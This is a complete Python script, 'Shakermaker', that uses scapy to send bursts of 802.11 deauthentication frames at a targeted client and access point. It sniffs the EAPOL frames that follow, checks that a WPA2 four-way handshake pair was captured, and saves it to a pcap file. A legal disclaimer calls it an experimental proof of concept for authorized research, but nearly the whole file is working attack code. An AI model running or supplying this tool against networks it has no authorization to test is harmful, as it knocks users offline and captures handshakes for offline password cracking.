#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shakermaker — experimental 802.11 deauthentication helper with EAPOL capture
(WPA2 four-way handshake oriented).

================================================================================
DISCLAIMER — READ BEFORE USE
================================================================================
This software is an UNFINISHED, EXPERIMENTAL PROOF OF CONCEPT. It was produced
as informal exploratory work (“vibe coded”) and has NOT been subjected to
systematic quality assurance, security review, penetration testing, or
regression testing against real hardware and drivers.

It is provided STRICTLY FOR AUTHORIZED SECURITY RESEARCH, EDUCATION, AND
CONTROLLED LABORATORY USE on networks and systems you own or for which you have
explicit written permission. It is NOT intended, designed, or suitable for
operational security assessments, red-team engagements, or any use outside
clearly defined, lawful research contexts.

The authors and contributors assume NO LIABILITY for misuse, damage, legal
consequences, or any direct or indirect harm arising from use or misuse of this
software. You are solely responsible for compliance with applicable laws,
regulations, and organizational policies.

By using this software, you acknowledge these limitations and accept full
responsibility for your actions.
================================================================================

Operational note: this program does NOT place the wireless interface into
monitor mode; it only validates that the interface appears suitable. You must
configure monitor mode and permissions yourself, in line with your environment
and authorization.
"""

from __future__ import annotations

import argparse
import logging
import os
import queue
import sys
import threading
import time
from datetime import datetime
from typing import List, Optional, Set, Tuple

from scapy.all import Dot11, Dot11Deauth, RadioTap, sniff, sendp, wrpcap
from scapy.packet import Packet
from scapy.utils import EUI

# -----------------------------------------------------------------------------
# Constants
# -----------------------------------------------------------------------------

# Linux sysfs: /sys/class/net/<iface>/type == 803 (ARPHRD_IEEE80211_RADIOTAP)
ARPHRD_IEEE80211_RADIOTAP = 803

# IEEE 802.1X EAPOL EtherType (big-endian on the wire)
EAPOL_ETHERTYPE = b"\x88\x8e"

# EAPOL-Key frame type (WPA/WPA2)
EAPOL_KEY_TYPE = 3

# Key Information field bits (heuristic message classification; optional path)
KI_MIC = 0x0080
KI_SECURE = 0x0400
KI_ACK = 0x0800


def _setup_logging() -> None:
    """Configure logging to stderr (INFO/DEBUG); application logic uses logging only."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


def _normalize_mac(mac: str) -> str:
    """Return a canonical lowercase string representation of a MAC address."""
    return str(EUI(mac)).lower()


def _mac_in_bssid_fields(dot11: Dot11, bssid_norm: str) -> bool:
    """Return True if the BSSID appears in addr1, addr2, or addr3."""
    for attr in ("addr1", "addr2", "addr3"):
        a = getattr(dot11, attr, None)
        if a and _normalize_mac(a) == bssid_norm:
            return True
    return False


def _from_ds_to_ds(dot11: Dot11) -> Tuple[bool, bool]:
    """Extract ToDS and FromDS from the Frame Control field; returns (to_ds, from_ds)."""
    fc = int(dot11.FCfield)
    to_ds = (fc & 0x01) != 0
    from_ds = (fc & 0x02) != 0
    return to_ds, from_ds


def _direction_ap_to_sta(
    dot11: Dot11, bssid_norm: str, target_norm: str
) -> bool:
    """
    Typical infrastructure downlink: FromDS=1, ToDS=0.
    addr1 = DA (client), addr2 = SA (AP / BSSID).
    """
    to_ds, from_ds = _from_ds_to_ds(dot11)
    if not (from_ds and not to_ds):
        return False
    a1 = dot11.addr1 and _normalize_mac(dot11.addr1) == target_norm
    a2 = dot11.addr2 and _normalize_mac(dot11.addr2) == bssid_norm
    return bool(a1 and a2)


def _direction_sta_to_ap(
    dot11: Dot11, bssid_norm: str, target_norm: str
) -> bool:
    """
    Typical infrastructure uplink: ToDS=1, FromDS=0.
    addr1 = BSSID, addr2 = SA (client).
    """
    to_ds, from_ds = _from_ds_to_ds(dot11)
    if not (to_ds and not from_ds):
        return False
    a1 = dot11.addr1 and _normalize_mac(dot11.addr1) == bssid_norm
    a2 = dot11.addr2 and _normalize_mac(dot11.addr2) == target_norm
    return bool(a1 and a2)


def _find_eapol_ethertype_index(raw_bytes: bytes) -> int:
    """Locate 0x88 0x8e in the raw frame (no BPF; tolerates leading QoS / driver quirks)."""
    return raw_bytes.find(EAPOL_ETHERTYPE)


def _parse_eapol_key_meta(
    raw_bytes: bytes, ethertype_idx: int
) -> Optional[Tuple[int, int, bytes]]:
    """
    Optionally parse WPA2 EAPOL-Key metadata after the EtherType.

    Returns (key_information, replay_counter_int, replay_counter_bytes) or None.
    """
    # EAPOL header begins immediately after the two-byte EtherType
    i = ethertype_idx + 2
    if i + 4 > len(raw_bytes):
        return None
    eapol_version = raw_bytes[i]
    eapol_type = raw_bytes[i + 1]
    eapol_len = int.from_bytes(raw_bytes[i + 2 : i + 4], "big")
    body_start = i + 4
    if eapol_type != EAPOL_KEY_TYPE or body_start + 13 > len(raw_bytes):
        return None
    # WPA2 Key Descriptor: Type(1) + Key Information(2) + Key Length(2) + Replay Counter(8)
    key_info = int.from_bytes(raw_bytes[body_start + 1 : body_start + 3], "big")
    rc_bytes = raw_bytes[body_start + 5 : body_start + 13]
    rc_int = int.from_bytes(rc_bytes, "big")
    _ = eapol_version, eapol_len  # parsed for structure alignment / future debugging
    return key_info, rc_int, rc_bytes


def _rough_key_message_pair(
    key_info_ap_to_sta: int, key_info_sta_to_ap: int
) -> bool:
    """
    Heuristic only: message 1 often has ACK without MIC; message 2 sets MIC.
    This does not replace a full WPA state machine; it supplements direction checks.
    """
    m1_ok = (key_info_ap_to_sta & KI_ACK) and not (key_info_ap_to_sta & KI_MIC)
    m2_ok = bool(key_info_sta_to_ap & KI_MIC)
    return m1_ok and m2_ok


def validate_handshake_pair(
    packets: List[Packet], bssid_norm: str, target_norm: str
) -> Tuple[bool, Optional[Tuple[int, int]]]:
    """
    Minimum bar: at least one EAPOL data frame AP→STA and one STA→AP
    (BSSID / STA roles inferred from addr1/addr2 as above).

    Optional enhancement: matching replay counter plus coarse Key Information
    agreement between a candidate pair.
    """
    ap_to_sta_pkts: List[Packet] = []
    sta_to_ap_pkts: List[Packet] = []

    for pkt in packets:
        if not pkt.haslayer(Dot11):
            continue
        d = pkt[Dot11]
        if d.type != 2:
            continue
        raw_bytes = bytes(pkt)
        eth_idx = _find_eapol_ethertype_index(raw_bytes)
        if eth_idx < 0:
            continue
        if not _mac_in_bssid_fields(d, bssid_norm):
            continue

        if _direction_ap_to_sta(d, bssid_norm, target_norm):
            ap_to_sta_pkts.append(pkt)
        elif _direction_sta_to_ap(d, bssid_norm, target_norm):
            sta_to_ap_pkts.append(pkt)

    if not ap_to_sta_pkts or not sta_to_ap_pkts:
        return False, None

    # Optional path: first plausible pair with identical replay counter
    for p1 in ap_to_sta_pkts:
        r1 = bytes(p1)
        i1 = _find_eapol_ethertype_index(r1)
        if i1 < 0:
            continue
        meta1 = _parse_eapol_key_meta(r1, i1)
        if not meta1:
            continue
        ki1, rc1, _ = meta1

        for p2 in sta_to_ap_pkts:
            r2 = bytes(p2)
            i2 = _find_eapol_ethertype_index(r2)
            if i2 < 0:
                continue
            meta2 = _parse_eapol_key_meta(r2, i2)
            if not meta2:
                continue
            ki2, rc2, _ = meta2

            if rc1 == rc2 and _rough_key_message_pair(ki1, ki2):
                logging.debug(
                    "Handshake validation: replay counter=%s, KeyInfo (AP→STA / STA→AP)=%#x / %#x",
                    rc1,
                    ki1,
                    ki2,
                )
                return True, (rc1, rc2)

    # Fallback: direction-only pairing with EAPOL present (no replay-counter bonus)
    logging.info(
        "Handshake validation: directional pair detected (AP→STA / STA→AP) "
        "without replay-counter cross-check."
    )
    return True, None


# -----------------------------------------------------------------------------
# Pre-flight checks
# -----------------------------------------------------------------------------


def require_root() -> None:
    """Raw sockets (sendp/sniff) require superuser privileges on typical Linux setups."""
    if os.name != "posix":
        logging.error(
            "Non-POSIX platform: raw 802.11 injection/sniffing is not supported here. "
            "Use Linux (or another supported Unix) with appropriate drivers."
        )
        sys.exit(1)
    try:
        euid = os.geteuid()
    except AttributeError:
        logging.error("os.geteuid() is not available; aborting.")
        sys.exit(1)
    if euid != 0:
        logging.error("Superuser privileges required (effective UID must be 0).")
        sys.exit(1)
    logging.debug("Privilege check passed (EUID 0).")


def assert_monitor_radiotap(iface: str) -> None:
    """
    Verify /sys/class/net/<iface>/type == 803 (monitor / radiotap).
    This does not configure the interface; it validates state only.
    """
    type_path = f"/sys/class/net/{iface}/type"
    if not os.path.isfile(type_path):
        logging.error(
            "Interface %s does not exist or has no sysfs type entry.", iface
        )
        sys.exit(1)
    try:
        with open(type_path, encoding="ascii") as fh:
            val = int(fh.read().strip())
    except (OSError, ValueError) as exc:
        logging.error("Failed to read interface type: %s", exc)
        sys.exit(1)

    if val != ARPHRD_IEEE80211_RADIOTAP:
        logging.error(
            "Interface %s is not in the expected monitor mode "
            "(type=%s, expected %s).",
            iface,
            val,
            ARPHRD_IEEE80211_RADIOTAP,
        )
        sys.exit(1)
    logging.info(
        "Interface %s: monitor / radiotap mode confirmed (type=%s).", iface, val
    )


# -----------------------------------------------------------------------------
# Sniffer (background thread)
# -----------------------------------------------------------------------------


def eapol_sniffer(
    iface: str,
    bssid: str,
    target: str,
    stop_event: threading.Event,
    packet_queue: "queue.Queue[Packet]",
) -> None:
    """
    Run sniff() with store=0 and no BPF filter (avoids QoS / driver edge cases).

    User-space filtering: data frames only, BSSID in addr1/addr2/addr3, and
    EAPOL EtherType present in raw bytes.
    """
    bssid_norm = _normalize_mac(bssid)
    target_norm = _normalize_mac(target)
    logging.debug(
        "EAPOL sniffer started: iface=%s BSSID=%s STA=%s",
        iface,
        bssid_norm,
        target_norm,
    )

    def _prn(pkt: Packet) -> None:
        if stop_event.is_set():
            return
        try:
            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt[Dot11]
            # (1) 802.11 data frame
            if dot11.type != 2:
                return
            # (2) BSSID must appear in addr1, addr2, or addr3
            if not _mac_in_bssid_fields(dot11, bssid_norm):
                return

            raw_bytes = bytes(pkt)
            # (3) EAPOL signature in raw bytes (no kernel BPF)
            if EAPOL_ETHERTYPE not in raw_bytes:
                return

            logging.debug(
                "EAPOL candidate: FCfield=%s addr1=%s addr2=%s addr3=%s",
                hex(int(dot11.FCfield)),
                dot11.addr1,
                dot11.addr2,
                dot11.addr3,
            )
            packet_queue.put(pkt)
        except Exception:
            logging.exception("Exception in sniffer callback (prn)")

    try:
        sniff(
            iface=iface,
            prn=_prn,
            store=0,
            stop_filter=lambda _p: stop_event.is_set(),
        )
    except Exception:
        logging.exception("Sniffer (sniff) terminated with an error")


# -----------------------------------------------------------------------------
# Deauthentication injector
# -----------------------------------------------------------------------------


def build_deauth_frame(bssid: str, target: str) -> Packet:
    """Build a valid 802.11 management deauthentication frame (reason code 7)."""
    return (
        RadioTap()
        / Dot11(
            type=0,
            subtype=12,
            addr1=target,
            addr2=bssid,
            addr3=bssid,
        )
        / Dot11Deauth(reason=7)
    )


def send_deauth_burst(iface: str, frame: Packet, burst: int) -> None:
    """Transmit burst frames via sendp with 0.1 s spacing between frames."""
    logging.info(
        "Transmitting deauthentication burst: %s frames, inter=0.1s, reason=7, iface=%s",
        burst,
        iface,
    )
    sendp(frame, iface=iface, count=burst, inter=0.1, verbose=False)


# -----------------------------------------------------------------------------
# Orchestration and graceful shutdown
# -----------------------------------------------------------------------------

MAX_BURST_ROUNDS = 3


def _drain_queue(q: "queue.Queue[Packet]") -> List[Packet]:
    out: List[Packet] = []
    while True:
        try:
            out.append(q.get_nowait())
        except queue.Empty:
            break
    return out


def _merge_unique_packets(
    existing: List[Packet], new: List[Packet], seen_hashes: Set[int]
) -> None:
    for p in new:
        h = hash(bytes(p))
        if h in seen_hashes:
            continue
        seen_hashes.add(h)
        existing.append(p)


def _save_pcap(
    packets: List[Packet],
    bssid: str,
    partial: bool = False,
) -> Optional[str]:
    if not packets:
        logging.warning("No packets to write.")
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_bssid = _normalize_mac(bssid).replace(":", "")
    suffix = "_partial" if partial else ""
    fname = f"handshake_{safe_bssid}_{ts}{suffix}.pcap"
    try:
        wrpcap(fname, packets)
        logging.info("Wrote PCAP: %s (%s packets)", fname, len(packets))
        return fname
    except OSError:
        logging.exception("wrpcap failed")
        return None


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=(
            "Shakermaker — experimental deauthentication + WPA2 handshake-oriented capture. "
            "Monitor mode must be configured externally. "
            "See module docstring for legal and quality disclaimers."
        ),
    )
    p.add_argument(
        "--bssid",
        required=True,
        help="MAC address of the target access point (BSSID)",
    )
    p.add_argument(
        "--target",
        required=True,
        help="MAC address of the target station (client)",
    )
    p.add_argument(
        "--iface",
        default="wlan0mon",
        help="Monitor-mode interface name (default: wlan0mon)",
    )
    p.add_argument(
        "--burst",
        type=int,
        default=5,
        help="Number of deauthentication frames per burst (default: 5)",
    )
    p.add_argument(
        "--timeout",
        type=float,
        default=15.0,
        help="Seconds to wait after each burst before evaluation (default: 15)",
    )
    p.add_argument(
        "--debug",
        action="store_true",
        help="Enable DEBUG logging",
    )
    return p.parse_args(argv)


def main(argv: Optional[List[str]] = None) -> int:
    args = parse_args(argv)
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    require_root()
    assert_monitor_radiotap(args.iface)

    bssid_norm = _normalize_mac(args.bssid)
    target_norm = _normalize_mac(args.target)

    stop_event = threading.Event()
    packet_queue: "queue.Queue[Packet]" = queue.Queue()
    captured: List[Packet] = []
    seen_hashes: Set[int] = set()

    sniffer_thread = threading.Thread(
        target=eapol_sniffer,
        name="eapol_sniffer",
        args=(args.iface, args.bssid, args.target, stop_event, packet_queue),
        daemon=True,
    )

    exit_code = 1
    try:
        sniffer_thread.start()
        time.sleep(0.3)  # allow the sniffer thread to initialize

        deauth = build_deauth_frame(args.bssid, args.target)

        for round_idx in range(1, MAX_BURST_ROUNDS + 1):
            if stop_event.is_set():
                break
            logging.info(
                "Burst round %s/%s (burst=%s, timeout=%ss)",
                round_idx,
                MAX_BURST_ROUNDS,
                args.burst,
                args.timeout,
            )
            send_deauth_burst(args.iface, deauth, args.burst)
            time.sleep(args.timeout)

            batch = _drain_queue(packet_queue)
            _merge_unique_packets(captured, batch, seen_hashes)

            ok, _rc = validate_handshake_pair(captured, bssid_norm, target_norm)
            if ok:
                logging.info(
                    "Minimal four-way handshake criteria met; writing PCAP."
                )
                _save_pcap(captured, args.bssid, partial=False)
                exit_code = 0
                break

        if exit_code != 0:
            logging.warning(
                "No complete directional handshake pair after %s burst rounds; exiting.",
                MAX_BURST_ROUNDS,
            )

    except KeyboardInterrupt:
        logging.info("KeyboardInterrupt received; performing graceful shutdown.")
        exit_code = 130
    except Exception:
        logging.exception("Unexpected error in main execution path")
        exit_code = 1
    finally:
        stop_event.set()
        sniffer_thread.join(timeout=8.0)
        if sniffer_thread.is_alive():
            logging.warning("Sniffer thread did not join in time; continuing shutdown.")

        final_batch = _drain_queue(packet_queue)
        _merge_unique_packets(captured, final_batch, seen_hashes)

        if exit_code != 0 and captured:
            logging.info("Saving partial capture from graceful shutdown.")
            _save_pcap(captured, args.bssid, partial=True)

    return exit_code


if __name__ == "__main__":
    _setup_logging()
    sys.exit(main())
